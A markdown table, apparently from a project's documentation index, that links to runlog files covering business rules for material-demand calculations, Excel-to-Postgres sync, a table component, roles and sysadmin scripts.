| [`docs/EXPORTS_ROLES_SYSADMIN_RUNLOG.md`](docs/EXPORTS_ROLES_SYSADMIN_RUNLOG.md) | Rules 7-8: the PDF overlap measurements, the global xlsx template, the Auditor role, power.sh + backup_db.sh |
| [`docs/SME_ORDERED_SUBSET_RULE_RUNLOG.md`](docs/SME_ORDERED_SUBSET_RULE_RUNLOG.md) | Rule 1c: the double-count, the 22,951-unit buy-list correction, suite BC |
| [`docs/SME_FINAL_MATH_ALIGNMENT_RUNLOG.md`](docs/SME_FINAL_MATH_ALIGNMENT_RUNLOG.md) | The last two loopholes: scope-wide bottleneck + calculator component identity |
| [`docs/SME_TIER_SEGREGATION_RUNLOG.md`](docs/SME_TIER_SEGREGATION_RUNLOG.md) | Rule 1b: the six layers that merged the tiers, the 21.5% measurement, the per-tab audit |
| [`docs/SME_STRICT_DECOUPLING_RUNLOG.md`](docs/SME_STRICT_DECOUPLING_RUNLOG.md) | Rule 1a: the two ledger leaks, suite BA, the CLI + header fixes, the re-sync |
| [`docs/SME_COMPONENT_POOLING_RUNLOG.md`](docs/SME_COMPONENT_POOLING_RUNLOG.md) | The `(Material_Code, SAP_Code)` ruling, end to end |
| [`docs/TABLE_TOOLS_RUNLOG.md`](docs/TABLE_TOOLS_RUNLOG.md) | `smartTable.tsx` and the four rules |
| [`docs/SME_SQM_BOTTLENECK_RUNLOG.md`](docs/SME_SQM_BOTTLENECK_RUNLOG.md) | Available vs Ordered, reverse-SQM bottleneck |
| [`docs/SESSION_REPORT_SUMMARY_RUNLOG.md`](docs/SESSION_REPORT_SUMMARY_RUNLOG.md) | Total Material Demand aggregation |
| [`docs/PG_EXCEL_SYNC_RUNLOG.md`](docs/PG_EXCEL_SYNC_RUNLOG.md) | The atomic Excel → Postgres sync |
| [`docs/POSTGRES_MIGRATION.md`](docs/POSTGRES_MIGRATION.md) §8 | The full per-slice project history |
